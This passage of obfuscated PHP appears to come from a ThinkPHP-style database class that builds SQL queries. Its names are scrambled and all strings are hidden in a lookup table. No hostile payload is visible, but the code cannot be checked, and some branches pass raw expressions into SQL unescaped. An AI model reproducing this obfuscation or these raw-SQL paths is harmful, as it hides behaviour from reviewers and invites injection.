think_config($–ÀÚœÛÎ[1052]), $–ÀÚœÛÎ[21] => think_config($–ÀÚœÛÎ[335]), $–ÀÚœÛÎ[988] => think_config($–ÀÚœÛÎ[1047]), $–ÀÚœÛÎ[17] => think_config($–ÀÚœÛÎ[1053])); } } return $¸ÃÄÓÕµ; } protected function initConnect($ÃÆÂûş¤ = true) { if (1 == think_config($_SERVER[äô®•½Â][22])) { $this->_linkID = $this->multiConnect($ÃÆÂûş¤); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¤Âå¸ƒœ => $È‰æ½¬ã) { $this->_linkID = $È‰æ½¬ã; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ì§±á¡¨ = false) { $È‘˜‰Çœ =& $_SERVER[äô®•½Â]; static $°êĞñ¿ = array(); static $Û“ÕÑú± = -1; if (empty($°êĞñ¿)) { foreach ($this->config as $ø¨…óµé => $´ÅÜÙô¥) { $°êĞñ¿[$ø¨…óµé] = explode($È‘˜‰Çœ[50], $´ÅÜÙô¥); } } if (think_config($È‘˜‰Çœ[1054])) { if ($Ì§±á¡¨ || think_config($È‘˜‰Çœ[482]) === !0) { $ˆÂ­€¹‚ = floor(mt_rand(0, think_config($È‘˜‰Çœ[1055]) - 1)); $Û“ÕÑú± = $ˆÂ­€¹‚; } else { if (is_numeric(think_config($È‘˜‰Çœ[1056]))) { $ˆÂ­€¹‚ = think_config($È‘˜‰Çœ[1056]); } else { $ˆÂ­€¹‚ = floor(mt_rand(think_config($È‘˜‰Çœ[1055]), count($°êĞñ¿[$È‘˜‰Çœ[958]]) - 1)); } } } else { $ˆÂ­€¹‚ = floor(mt_rand(0, count($°êĞñ¿[$È‘˜‰Çœ[958]]) - 1)); $Û“ÕÑú± = $ˆÂ­€¹‚; } $ˆÂ­€¹‚ = $Û“ÕÑú± !== -1 ? $Û“ÕÑú± : $ˆÂ­€¹‚; $ÇÁ”¨‚  = array($È‘˜‰Çœ[960] => isset($°êĞñ¿[$È‘˜‰Çœ[960]][$ˆÂ­€¹‚]) ? $°êĞñ¿[$È‘˜‰Çœ[960]][$ˆÂ­€¹‚] : $°êĞñ¿[$È‘˜‰Çœ[960]][0], $È‘˜‰Çœ[961] => isset($°êĞñ¿[$È‘˜‰Çœ[961]][$ˆÂ­€¹‚]) ? $°êĞñ¿[$È‘˜‰Çœ[961]][$ˆÂ­€¹‚] : $°êĞñ¿[$È‘˜‰Çœ[961]][0], $È‘˜‰Çœ[958] => isset($°êĞñ¿[$È‘˜‰Çœ[958]][$ˆÂ­€¹‚]) ? $°êĞñ¿[$È‘˜‰Çœ[958]][$ˆÂ­€¹‚] : $°êĞñ¿[$È‘˜‰Çœ[958]][0], $È‘˜‰Çœ[959] => isset($°êĞñ¿[$È‘˜‰Çœ[959]][$ˆÂ­€¹‚]) ? $°êĞñ¿[$È‘˜‰Çœ[959]][$ˆÂ­€¹‚] : $°êĞñ¿[$È‘˜‰Çœ[959]][0], $È‘˜‰Çœ[21] => isset($°êĞñ¿[$È‘˜‰Çœ[21]][$ˆÂ­€¹‚]) ? $°êĞñ¿[$È‘˜‰Çœ[21]][$ˆÂ­€¹‚] : $°êĞñ¿[$È‘˜‰Çœ[21]][0], $È‘˜‰Çœ[988] => isset($°êĞñ¿[$È‘˜‰Çœ[988]][$ˆÂ­€¹‚]) ? $°êĞñ¿[$È‘˜‰Çœ[988]][$ˆÂ­€¹‚] : $°êĞñ¿[$È‘˜‰Çœ[988]][0], $È‘˜‰Çœ[17] => isset($°êĞñ¿[$È‘˜‰Çœ[17]][$ˆÂ­€¹‚]) ? $°êĞñ¿[$È‘˜‰Çœ[17]][$ˆÂ­€¹‚] : $°êĞñ¿[$È‘˜‰Çœ[17]][0]); return $this->connect($ÇÁ”¨‚ , $ˆÂ­€¹‚); } public function parseDSN($Òá¤§«) { $˜Ñ¨§²¡ =& $_SERVER[äô®•½Â]; if (empty($Òá¤§«)) { return !1; } $ıôÌÆ  = parse_url($Òá¤§«); if ($ıôÌÆ [$˜Ñ¨§²¡[208]]) { $Ñ‹·ÙÁ· = array($˜Ñ¨§²¡[1033] => $ıôÌÆ [$˜Ñ¨§²¡[208]], $˜Ñ¨§²¡[960] => isset($ıôÌÆ [$˜Ñ¨§²¡[678]]) ? $ıôÌÆ [$˜Ñ¨§²¡[678]] : $˜Ñ¨§²¡[12], $˜Ñ¨§²¡[961] => isset($ıôÌÆ [$˜Ñ¨§²¡[1057]]) ? $ıôÌÆ [$˜Ñ¨§²¡[1057]] : $˜Ñ¨§²¡[12], $˜Ñ¨§²¡[958] => isset($ıôÌÆ [$˜Ñ¨§²¡[209]]) ? $ıôÌÆ [$˜Ñ¨§²¡[209]] : $˜Ñ¨§²¡[12], $˜Ñ¨§²¡[959] => isset($ıôÌÆ [$˜Ñ¨§²¡[210]]) ? $ıôÌÆ [$˜Ñ¨§²¡[210]] : $˜Ñ¨§²¡[12], $˜Ñ¨§²¡[21] => isset($ıôÌÆ [$˜Ñ¨§²¡[87]]) ? substr($ıôÌÆ [$˜Ñ¨§²¡[87]], 1) : $˜Ñ¨§²¡[12]); } else { preg_match($˜Ñ¨§²¡[1058], trim($Òá¤§«), $Ò³›£‹¥); $Ñ‹·ÙÁ· = array($˜Ñ¨§²¡[1033] => $Ò³›£‹¥[1], $˜Ñ¨§²¡[960] => $Ò³›£‹¥[2], $˜Ñ¨§²¡[961] => $Ò³›£‹¥[3], $˜Ñ¨§²¡[958] => $Ò³›£‹¥[4], $˜Ñ¨§²¡[959] => $Ò³›£‹¥[5], $˜Ñ¨§²¡[21] => $Ò³›£‹¥[6]); } $Ñ‹·ÙÁ·[$˜Ñ¨§²¡[988]] = $˜Ñ¨§²¡[12]; return $Ñ‹·ÙÁ·; } protected function debug() { $ßøöáêÈ =& $_SERVER[äô®•½Â]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ßøöáêÈ[1059]; if (think_config($ßøöáêÈ[1060])) { think_status($ßøöáêÈ[1061]); think_trace($this->queryStr . $ßøöáêÈ[1062] . think_status($ßøöáêÈ[24], $ßøöáêÈ[1061], 6) . $ßøöáêÈ[1063], $ßøöáêÈ[12], $ßøöáêÈ[1064]); } } protected function parseLock($ÉëÁìü = false) { $¥³Í—ì =& $_SERVER[äô®•½Â]; if (!$ÉëÁìü) { return $¥³Í—ì[12]; } if ($¥³Í—ì[990] == $this->dbType) { return $¥³Í—ì[1065]; } return $¥³Í—ì[1066]; } protected function parseSet($¢ÓÃéó) { $Œğãéªî =& $_SERVER[äô®•½Â]; foreach ($¢ÓÃéó as $ĞƒÓëœ´ => $ÙÚå–Šø) { if (is_array($ÙÚå–Šø) && $Œğãéªî[383] == $ÙÚå–Šø[0]) { $Æ©¥Î¨î[] = $this->parseKey($ĞƒÓëœ´) . $Œğãéªî[517] . $ÙÚå–Šø[1]; } elseif (is_scalar($ÙÚå–Šø) || is_null($ÙÚå–Šø)) { $Æ©¥Î¨î[] = $this->parseKey($ĞƒÓëœ´) . $Œğãéªî[517] . $this->parseValue($ÙÚå–Šø); } } return $Œğãéªî[1067] . implode($Œğãéªî[50], $Æ©¥Î¨î); } protected function bindParam($ğ’¤¸ë”, $­Ûî–„Ç) { $this->bind[$_SERVER[äô®•½Â][4] . $ğ’¤¸ë”] = $­Ûî–„Ç; } protected function parseBind($§í…»ŸÇ) { $§í…»ŸÇ = array_merge($this->bind, $§í…»ŸÇ); $this->bind = array(); return $§í…»ŸÇ; } function parseKey(&$„ï»³õ, $Œ›àûÎå = true) { if ($Œ›àûÎå) { $„ï»³õ = $this->parseKeyCheck($„ï»³õ); } return $„ï»³õ; } function parseKeyCheck($ğ÷‚À©Â) { $®œˆ—ŞÖ =& $_SERVER[äô®•½Â]; $ğ÷‚À©Â = trim($ğ÷‚À©Â); if (!preg_match($®œˆ—ŞÖ[1068], $ğ÷‚À©Â)) { think_exception($®œˆ—ŞÖ[1069] . $ğ÷‚À©Â); } return $ğ÷‚À©Â; } protected function parseValue($Å¾–ÇµŞ) { $ä“¶Ğ…” =& $_SERVER[äô®•½Â]; if (is_string($Å¾–ÇµŞ)) { $Å¾–ÇµŞ = $ä“¶Ğ…”[1029] . $this->escapeString($Å¾–ÇµŞ) . $ä“¶Ğ…”[1029]; } elseif (isset($Å¾–ÇµŞ[0]) && is_string($Å¾–ÇµŞ[0]) && strtolower($Å¾–ÇµŞ[0]) == $ä“¶Ğ…”[383]) { $Å¾–ÇµŞ = $this->escapeString($Å¾–ÇµŞ[1]); } elseif (is_array($Å¾–ÇµŞ)) { $Å¾–ÇµŞ = array_map(array($this, $ä“¶Ğ…”[1030]), $Å¾–ÇµŞ); } elseif (is_bool($Å¾–ÇµŞ)) { $Å¾–ÇµŞ = $Å¾–ÇµŞ ? $ä“¶Ğ…”[91] : $ä“¶Ğ…”[231]; } elseif (is_null($Å¾–ÇµŞ)) { $Å¾–ÇµŞ = $ä“¶Ğ…”[106]; } return $Å¾–ÇµŞ; } protected function parseField($“–·ï¥§) { $•Ó¬ Ô =& $_SERVER[äô®•½Â]; if (is_string($“–·ï¥§) && strpos($“–·ï¥§, $•Ó¬ Ô[50])) { $“–·ï¥§ = explode($•Ó¬ Ô[50], $“–·ï¥§); } if (is_array($“–·ï¥§)) { $ÕÒÆ»‚í = array(); foreach ($“–·ï¥§ as $­ıè‚¾¥ => $²  ¡Œâ) { if (!is_numeric($­ıè‚¾¥)) { $ÕÒÆ»‚í[] = $this->parseKey($­ıè‚¾¥, !1) . $•Ó¬ Ô[1070] . $this->parseKey($²  ¡Œâ); } else { $ÕÒÆ»‚í[] = $this->parseKey($²  ¡Œâ); } } $›€¨‹‡Ã = implode($•Ó¬ Ô[50], $ÕÒÆ»‚í); } elseif (is_string($“–·ï¥§) && !empty($“–·ï¥§)) { $›€¨‹‡Ã = $“–·ï¥§; } else { $›€¨‹‡Ã = $•Ó¬ Ô[223]; } return $›€¨‹‡Ã; } protected function parseTable($Ú‡È¿¤) { $ŸÅ»Èâì =& $_SERVER[äô®•½Â]; if (is_array($Ú‡È¿¤)) { $™æıŠÄ© = array(); foreach ($Ú‡È¿¤ as $ß¿ùì¤ò => $Ú¨ÅÛ) { if (!is_numeric($ß¿ùì¤ò)) { $™æıŠÄ©[] = $this->parseKey($ß¿ùì¤ò) . $ŸÅ»Èâì[53] . $this->parseKey($Ú¨ÅÛ); } else { $™æıŠÄ©[] = $this->parseKey($ß¿ùì¤ò); } } $Ú‡È¿¤ = $™æıŠÄ©; } elseif (is_string($Ú‡È¿¤)) { if (strstr($Ú‡È¿¤, $ŸÅ»Èâì[53])) { return $Ú‡È¿¤; } $Ú‡È¿¤ = explode($ŸÅ»Èâì[50], $Ú‡È¿¤); array_walk($Ú‡È¿¤, array($this, $ŸÅ»Èâì[978])); } return $ŸÅ»Èâì[972] . trim(implode($ŸÅ»Èâì[1071], $Ú‡È¿¤), $ŸÅ»Èâì[472]) . $ŸÅ»Èâì[972]; } protected function parseWhere($¡ãö”‘Ö) { $®ôÀù°‰ =& $_SERVER[äô®•½Â]; $àÏÇéÒ¨ = $®ôÀù°‰[12]; if (is_string($¡ãö”‘Ö)) { $àÏÇéÒ¨ = $¡ãö”‘Ö; } else { $¹µøñ¼ö = isset($¡ãö”‘Ö[$®ôÀù°‰[1072]]) ? strtoupper($¡ãö”‘Ö[$®ôÀù°‰[1072]]) : $®ôÀù°‰[12]; if (in_array($¹µøñ¼ö, array($®ôÀù°‰[1073], $®ôÀù°‰[1074], $®ôÀù°‰[1075]))) { $¹µøñ¼ö = $®ôÀù°‰[53] . $¹µøñ¼ö . $®ôÀù°‰[53]; unset($¡ãö”‘Ö[$®ôÀù°‰[1072]]); } else { $¹µøñ¼ö = $®ôÀù°‰[1076]; } foreach ($¡ãö”‘Ö as $“àƒ™™½ => $Ä¥ıÙãÓ) { $àÏÇéÒ¨ .= $®ôÀù°‰[366]; if (is_numeric($“àƒ™™½)) { $“àƒ™™½ = $®ôÀù°‰[1077]; } if (0 === strpos($“àƒ™™½, $®ôÀù°‰[11])) { $àÏÇéÒ¨ .= $this->parseThinkWhere($“àƒ™™½, $Ä¥ıÙãÓ); } else { if (!preg_match($®ôÀù°‰[1078], trim($“àƒ™™½))) { think_exception(think_lang($®ôÀù°‰[1079]) . $®ôÀù°‰[4] . $“àƒ™™½); } $óÖøÍÇğ = is_array($Ä¥ıÙãÓ) && isset($Ä¥ıÙãÓ[$®ôÀù°‰[1080]]); $“àƒ™™½ = trim($“àƒ™™½); if (strpos($“àƒ™™½, $®ôÀù°‰[215])) { $¦‘íÖî¯ = explode($®ôÀù°‰[215], $“àƒ™™½); $¼¬çšöû = array(); foreach ($¦‘íÖî¯ as $ÕÁµ…•· => $‡ö¸¶ª§) { $¦²ó¥Ö¢ = $óÖøÍÇğ ? $Ä¥ıÙãÓ[$ÕÁµ…•·] : $Ä¥ıÙãÓ; $¼¬çšöû[] = $®ôÀù°‰[349] . $this->parseWhereItem($this->parseKey($‡ö¸¶ª§), $¦²ó¥Ö¢) . $®ôÀù°‰[977]; } $àÏÇéÒ¨ .= implode($®ôÀù°‰[1081], $¼¬çšöû); } elseif (strpos($“àƒ™™½, $®ôÀù°‰[287])) { $¦‘íÖî¯ = explode($®ôÀù°‰[287], $“àƒ™™½); $¼¬çšöû = array(); foreach ($¦‘íÖî¯ as $ÕÁµ…•· => $‡ö¸¶ª§) { $¦²ó¥Ö¢ = $óÖøÍÇğ ? $Ä¥ıÙãÓ[$ÕÁµ…•·] : $Ä¥ıÙãÓ; $¼¬çšöû[] = $®ôÀù°‰[349] . $this->parseWhereItem($this->parseKey($‡ö¸¶ª§), $¦²ó¥Ö¢) . $®ôÀù°‰[977]; } $àÏÇéÒ¨ .= implode($®ôÀù°‰[1076], $¼¬çšöû); } else { $àÏÇéÒ¨ .= $this->parseWhereItem($this->parseKey($“àƒ™™½), $Ä¥ıÙãÓ); } } $àÏÇéÒ¨ .= $®ôÀù°‰[367] . $¹µøñ¼ö; } $àÏÇéÒ¨ = substr($àÏÇéÒ¨, 0, -strlen($¹µøñ¼ö)); } return empty($àÏÇéÒ¨) ? $®ôÀù°‰[12] : $®ôÀù°‰[1082] . $àÏÇéÒ¨; } protected function parseWhereItem($ÏöÛÀå‘, $Õñ¸ŒÔä) { $Ä‰è«‡ =& $_SERVER[äô®•½Â]; $æù¬ìÔ = $Ä‰è«‡[12]; if (is_array($Õñ¸ŒÔä)) { if (is_string($Õñ¸ŒÔä[0])) { $–şˆàÂÌ = strtolower($Õñ¸ŒÔä[0]); if (in_array($Õñ¸ŒÔä[0], array($Ä‰è«‡[517], $Ä‰è«‡[1083], $Ä‰è«‡[1084], $Ä‰è«‡[1085], $Ä‰è«‡[1086], $Ä‰è«‡[1087]))) { $æù¬ìÔ .= $ÏöÛÀå‘ . $Ä‰è«‡[53] . $Õñ¸ŒÔä[0] . $Ä‰è«‡[53] . $this->parseValue($Õñ¸ŒÔä[1]); } elseif (preg_match($Ä‰è«‡[1088], $Õñ¸ŒÔä[0])) { $æù¬ìÔ .= $ÏöÛÀå‘ . $Ä‰è«‡[53] . $this->exp[$–şˆàÂÌ] . $Ä‰è«‡[53] . $this->parseValue($Õñ¸ŒÔä[1]); } elseif (preg_match($Ä‰è«‡[1089], $Õñ¸ŒÔä[0])) { if (is_array($Õñ¸ŒÔä[1])) { $šê­å› = isset($Õñ¸ŒÔä[2]) ? strtoupper($Õñ¸ŒÔä[2]) : $Ä‰è«‡[1074]; if (in_array($šê­å›, array($Ä‰è«‡[1073], $Ä‰è«‡[1074], $Ä‰è«‡[1075]))) { $£±Ğù  = array(); foreach ($Õñ¸ŒÔä[1] as $œ¬Î—Ÿ¢) { $£±Ğù [] = $ÏöÛÀå‘ . $Ä‰è«‡[53] . $this->exp[$–şˆàÂÌ] . $Ä‰è«‡[53] . $this->parseValue($œ¬Î—Ÿ¢); } $æù¬ìÔ .= $Ä‰è«‡[349] . implode($Ä‰è«‡[53] . $šê­å› . $Ä‰è«‡[53], $£±Ğù ) . $Ä‰è«‡[977]; } } else { $æù¬ìÔ .= $ÏöÛÀå‘ . $Ä‰è«‡[53] . $this->exp[$–şˆàÂÌ] . $Ä‰è«‡[53] . $this->parseValue($Õñ¸ŒÔä[1]); } } elseif ($Ä‰è«‡[383] == $–şˆàÂÌ) { $æù¬ìÔ .= $Ä‰è«‡[975] . $ÏöÛÀå‘ . $Ä‰è«‡[53] . $Õñ¸ŒÔä[1] . $Ä‰è«‡[1090]; } elseif (preg_match($Ä‰è«‡[1091], $Õñ¸ŒÔä[0])) { $æù¬ìÔ .= $Õñ¸ŒÔä[0]; } elseif (preg_match($Ä‰è«‡[1092], $Õñ¸ŒÔä[0])) { if (isset($Õñ¸ŒÔä[2]) && $Ä‰è«‡[383] == $Õñ¸ŒÔä[2]) { $æù¬ìÔ .= $ÏöÛÀå‘ . $Ä‰è«‡[53] . $this->exp[$–şˆàÂÌ] . $Ä‰è«‡[53] . $Õñ¸ŒÔä[1]; } else { if (is_string($Õñ¸ŒÔä[1])) { $Õñ¸ŒÔä[1] = explode($Ä‰è«‡[50], $Õñ¸ŒÔä[1]); } $¢÷Ğ«’ = implode($Ä‰è«‡[50], $this->parseValue($Õñ¸ŒÔä[1])); $æù¬ìÔ .= $ÏöÛÀå‘ . $Ä‰è«‡[53] . $this->exp[$–şˆàÂÌ] . $Ä‰è«‡[975] . $¢÷Ğ«’ . $Ä‰è«‡[977]; } } elseif (preg_match($Ä‰è«‡[1093], $Õñ¸ŒÔä[0])) { $â©â³¾È = is_string($Õñ¸ŒÔä[1]) ? explode($Ä‰è«‡[50], $Õñ¸ŒÔä[1]) : $Õñ¸ŒÔä[1]; $æù¬ìÔ .= $Ä‰è«‡[975] . $ÏöÛÀå‘ . $Ä‰è«‡[53] . $this->exp[$–şˆàÂÌ] . $Ä‰è«‡[53] . $this->parseValue($â©â³¾È[0]) . $Ä‰è«‡[1076] . $this->parseValue($â©â³¾È[1]) . $Ä‰è«‡[367]; } else { think_exception(think_lang($Ä‰è«‡[1079]) . $Ä‰è«‡[4] . $Õñ¸ŒÔä[0]); } } else { $Ğ˜Ğ ò¦ = count($Õñ¸ŒÔä); $åœÕú¼Ï = $Ä‰è«‡[12]; if (is_string($Õñ¸ŒÔä[$Ğ˜Ğ ò¦ - 1])) { $åœÕú¼Ï = isset($Õñ¸ŒÔä[$Ğ˜Ğ ò¦ - 1]) ? strtoupper($Õñ¸ŒÔä[$Ğ˜Ğ ò¦ - 1]) : $Ä‰è«‡[12]; if (in_array($åœÕú¼Ï, array($Ä‰è«‡[1073], $Ä‰è«‡[1074], $Ä‰è«‡[1075]))) { $Ğ˜Ğ ò¦ = $Ğ˜Ğ ò¦ - 1; } } else { $åœÕú¼Ï = $Ä‰è«‡[1073]; } for ($û§÷˜ëâ = 0; $û§÷˜ëâ < $Ğ˜Ğ ò¦; $û§÷˜ëâ++) { $â©â³¾È = is_array($Õñ¸ŒÔä[$û§÷˜ëâ]) ? $Õñ¸ŒÔä[$û§÷˜ëâ][1] : $Õñ¸ŒÔä[$û§÷˜ëâ]; if ($Ä‰è«‡[383] == strtolower($Õñ¸ŒÔä[$û§÷˜ëâ][0])) { $æù¬ìÔ .= $Ä‰è«‡[349] . $ÏöÛÀå‘ . $Ä‰è«‡[53] . $â©â³¾È . $Ä‰è«‡[1090] . $åœÕú¼Ï . $Ä‰è«‡[53]; } else { $åŸ ©è = is_array($Õñ¸ŒÔä[$û§÷˜ëâ]) ? $this->exp[strtolower($Õñ¸ŒÔä[$û§÷˜ëâ][0])] : $Ä‰è«‡[517]; if (!$åŸ ©è && is_array($Õñ¸ŒÔä[$û§÷˜ëâ]) && in_array($Õñ¸ŒÔä[$û§÷˜ëâ][0], array($Ä‰è«‡[517], $Ä‰è«‡[1083], $Ä‰è«‡[1084], $Ä‰è«‡[1085], $Ä‰è«‡[1086], $Ä‰è«‡[1087]))) { $åŸ ©è = $Õñ¸ŒÔä[$û§÷˜ëâ][0]; } $æù¬ìÔ .= $Ä‰è«‡[349] . $ÏöÛÀå‘ . $Ä‰è«‡[53] . $åŸ ©è . $Ä‰è«‡[53] . $this->parseValue($â©â³¾È) . $Ä‰è«‡[1090] . $åœÕú¼Ï . $Ä‰è«‡[53]; } } $æù¬ìÔ = substr($æù¬ìÔ, 0, -4); } } else { $æù¬ìÔ .= $ÏöÛÀå‘ . $Ä‰è«‡[1094] . $this->parseValue($Õñ¸ŒÔä); } return $æù¬ìÔ; } protected function parseThinkWhere($°ó´ìêö, $ØöÖÉ) { $ı§“ßÑÜ =& $_SERVER[äô®•½Â]; $‘­£ú¿ = $ı§“ßÑÜ[12]; switch ($°ó´ìêö) { case $ı§“ßÑÜ[438]: $‘­£ú¿ = $ØöÖÉ; break; case $ı§“ßÑÜ[1077]: $‘­£ú¿ = is_string($ØöÖÉ) ? $ØöÖÉ : substr($this->parseWhere($ØöÖÉ), 6); break; case $ı§“ßÑÜ[1095]: parse_str($ØöÖÉ, $–¢ô¢ñ¥); if (isset($–¢ô¢ñ¥[$ı§“ßÑÜ[1072]])) { $›Ø…Š°¬ = $ı§“ßÑÜ[53] . strtoupper($–¢ô¢ñ¥[$ı§“ßÑÜ[1072]]) . $ı§“ßÑÜ[53]; unset($–¢ô¢ñ¥[$ı§“ßÑÜ[1072]]); } else { $›Ø…Š°¬ = $ı§“ßÑÜ[1076]; } $àÍïÁ·² = array(); foreach ($–¢ô¢ñ¥ as $ëÚùÆ‘ => $ìèáÄûî) { $àÍïÁ·²[] = $this->parseKey($ëÚùÆ‘) . $ı§“ßÑÜ[1094] . $this->parseValue($ìèáÄûî); } $‘­£ú¿ = implode($›Ø…Š°¬, $àÍïÁ·²); break; } return $‘­£ú¿; } protected function parseLimit($¬Æ³ ëÇ) { $£ŸŒÔÄ =& $_SERVER[äô®•½Â]; return !empty($¬Æ³ ëÇ) ? $£ŸŒÔÄ[51] . $¬Æ³ ëÇ . $£ŸŒÔÄ[53] : $£ŸŒÔÄ[12]; } protected function parseJoin($Ş¹µµĞ) { $ªÉÁÙí =& $_SERVER[äô®•½Â]; $íúƒŸæ = $ªÉÁÙí[12]; if (!empty($Ş¹µµĞ)) { if (is_array($Ş¹µµĞ)) { foreach ($Ş¹µµĞ as $µŸ¼£´ => $·Ìâ¨Ş) { if (!1 !== stripos($·Ìâ¨Ş, $ªÉÁÙí[1096])) { $íúƒŸæ .= $ªÉÁÙí[53] . $·Ìâ¨Ş; } else { $íúƒŸæ .= $ªÉÁÙí[1097] . $·Ìâ¨Ş; } } } else { $íúƒŸæ .= $ªÉÁÙí[1097] . $Ş¹µµĞ; } } $íúƒŸæ = preg_replace($ªÉÁÙí[1098], think_config($ªÉÁÙí[1002]) . $ªÉÁÙí[1099], $íúƒŸæ); return $íúƒŸæ; } protected function parseOrder($şæ‰¼ÎÜ) { $é¬¼û™î =& $_SERVER[äô®•½Â]; if (is_array($şæ‰¼ÎÜ)) { $›²•üÇü = array(); foreach ($şæ‰¼ÎÜ as $æ÷öé¼å => $›Ë½Û¾ë) { if (is_numeric($æ÷öé¼å)) { $›²•üÇü[] = $this->parseKey($›Ë½Û¾ë); } else { $›Ë½Û¾ë = in_array(strtoupper(trim($›Ë½Û¾ë)), array($é¬¼û™î[1100], $é¬¼û™î[1101])) ? $é¬¼û™î[53] . $›Ë½Û¾ë : $é¬¼û™î[12]; if (preg_match($é¬¼û™î[1102], $æ÷öé¼å)) { $›²•üÇü[] = $this->parseKey($æ÷öé¼å) . $›Ë½Û¾ë; } else { think_exception($é¬¼û™î[1103] . $æ÷öé¼å); } } } $şæ‰¼ÎÜ = implode($é¬¼û™î[50], $›²•üÇü); } return !empty($şæ‰¼ÎÜ) ? $é¬¼û™î[1104] . $şæ‰¼ÎÜ : $é¬¼û™î[12]; } protected function parseGroup($íİòãò¤) { $¦ÑŞø÷À =& $_SERVER[äô®•½Â]; return !empty($íİòãò¤) ? $¦ÑŞø÷À[1105] . $íİòãò¤ : $¦ÑŞø÷À[12]; } protected function parseHaving($ò„”‚Ÿ) { $£ÎöœÛ =& $_SERVER[äô®•½Â]; return !empty($ò„”‚Ÿ) ? $£ÎöœÛ[1106] . $ò„”‚Ÿ : $£ÎöœÛ[12]; } protected function parseComment($ÄÈ¿ÅúÙ) { $â®ÉÏ˜õ =& $_SERVER[äô®•½Â]; return !empty($ÄÈ¿ÅúÙ) ? $â®ÉÏ˜õ[1107] . $ÄÈ¿ÅúÙ . $â®ÉÏ˜õ[1108] : $â®ÉÏ˜õ[12]; } protected function parseDistinct($©úø×‚) { $ìÎŞŞ½â =& $_SERVER[äô®•½Â]; return !empty($©úø×‚) ? $ìÎŞŞ½â[1109] : $ìÎŞŞ½â[12]; } protected function parseUnion($¢Ğ‘) { $ùÂëŒŞÁ =& $_SERVER[äô®•½Â]; if (empty($¢Ğ‘)) { return $ùÂëŒŞÁ[12]; } if (isset($¢Ğ‘[$ùÂëŒŞÁ[434]])) { $¡ïÆêÀ = $ùÂëŒŞÁ[1110]; unset($¢Ğ‘[$ùÂëŒŞÁ[434]]); } else { $¡ïÆêÀ = $ùÂëŒŞÁ[1111]; } foreach ($¢Ğ‘ as $Âç²‚„Ã) { $õ·±™±Ë[] = $¡ïÆêÀ . (is_array($Âç²‚„Ã) ? $this->buildSelectSql($Âç²‚„Ã) : $Âç²‚„Ã); } return implode($ùÂëŒŞÁ[53], $õ·±™±Ë); } public function insert($¯óÛÑƒ, $¾Ğ¨­ = array(), $Ì£üø­À = false) { $òßá»¾Ò =& $_SERVER[äô®•½Â]; $ØÔÙïÚº = $ÃæÚæ¬Ë = array(); $this->model = $¾Ğ¨­[$òßá»¾Ò[370]]; foreach ($¯óÛÑƒ as $—Ò«…¿™ => $œ——Á‘¯) { if (is_array($œ——Á‘¯) && $òßá»¾Ò[383] == $œ——Á‘¯[0]) { $ÃæÚæ¬Ë[] = $this->parseKey($—Ò«…¿™); $ØÔÙïÚº[] = $œ——Á‘¯[1]; } elseif (is_scalar($œ——Á‘¯) || is_null($œ——Á‘¯)) { $ÃæÚæ¬Ë[] = $this->parseKey($—Ò«…¿™); $ØÔÙïÚº[] = $this->parseValue($œ——Á‘¯); } } $±àÅ†• = ($Ì£üø­À ? $òßá»¾Ò[979] : $òßá»¾Ò[980]) . $òßá»¾Ò[981] . $this->parseTable($¾Ğ¨­[$òßá»¾Ò[368]]) . $òßá»¾Ò[975] . implode($òßá»¾Ò[50], $ÃæÚæ¬Ë) . $òßá»¾Ò[976] . implode($òßá»¾Ò[50], $ØÔÙïÚº) . $òßá»¾Ò[977]; $±àÅ†• .= $this->parseLock(isset($¾Ğ¨­[$òßá»¾Ò[915]]) ? $¾Ğ¨­[$òßá»¾Ò[915]] : !1); $±àÅ†• .= $this->parseComment(!empty($¾Ğ¨­[$òßá»¾Ò[440]]) ? $¾Ğ¨­[$òßá»¾Ò[440]] : $òßá»¾Ò[12]); return $this->execute($±àÅ†•, $this->parseBind(!empty($¾Ğ¨­[$òßá»¾Ò[372]]) ? $¾Ğ¨­[$òßá»¾Ò[372]] : array())); } public function selectInsert($‘Šû€, $óÅŸ× ı, $™’¬×äå = array()) { $î¢˜Ç†¤ =& $_SERVER[äô®•½Â]; $this->model = $™’¬×äå[$î¢˜Ç†¤[370]]; if (is_string($‘Šû€)) { $‘Šû€ = explode($î¢˜Ç†¤[50], $‘Šû€); } array_walk($‘Šû€, array($this, $î¢˜Ç†¤[978])); $ı«²È¹ˆ = $î¢˜Ç†¤[1112] . $this->parseTable($óÅŸ× ı) . $î¢˜Ç†¤[975] . implode($î¢˜Ç†¤[50], $‘Šû€) . $î¢˜Ç†¤[1090]; $ı«²È¹ˆ .= $this->buildSelectSql($™’¬×äå); return $this->execute($ı«²È¹ˆ, $this->parseBind(!empty($™’¬×äå[$î¢˜Ç†¤[372]]) ? $™’¬×äå[$î¢˜Ç†¤[372]] : array())); } public function update($î§ß‡…Û, $½òÑÇŞº) { $Ÿ²½×°Å =& $_SERVER[äô®•½Â]; $this->model = $½òÑÇŞº[$Ÿ²½×°Å[370]]; $¦¸„ş“ = $Ÿ²½×°Å[1113] . $this->parseTable($½òÑÇŞº[$Ÿ²½×°Å[368]]) . $this->parseSet($î§ß‡…Û) . $this->parseWhere(!empty($½òÑÇŞº[$Ÿ²½×°Å[364]]) ? $½òÑÇŞº[$Ÿ²½×°Å[364]] : $Ÿ²½×°Å[12]) . $this->parseOrder(!empty($½òÑÇŞº[$Ÿ²½×°Å[452]]) ? $½òÑÇŞº[$Ÿ²½×°Å[452]] : $Ÿ²½×°Å[12]) . $this->parseLimit(!empty($½òÑÇŞº[$Ÿ²½×°Å[379]]) ? $½òÑÇŞº[$Ÿ²½×°Å[379]] : $Ÿ²½×°Å[12]) . $this->parseLock(isset($½òÑÇŞº[$Ÿ²½×°Å[915]]) ? $½òÑÇŞº[$Ÿ²½×°Å[915]] : !1) . $this->parseComment(!empty($½òÑÇŞº[$Ÿ²½×°Å[440]]) ? $½òÑÇŞº[$Ÿ²½×°Å[440]] : $Ÿ²½×°Å[12]); return $this->execute($¦¸„ş“, $this->parseBind(!empty($½òÑÇŞº[$Ÿ²½×°Å[372]]) ? $½òÑÇŞº[$Ÿ²½×°Å[372]] : array())); } public function delete($¯É‡É = array()) { $Õæ¤¾ı© =& $_SERVER[äô®•½Â]; $this->model = $¯É‡É[$Õæ¤¾ı©[370]]; $¾¯†¶Ğ„ = $Õæ¤¾ı©[1114] . $this->parseTable($¯É‡É[$Õæ¤¾ı©[368]]) . 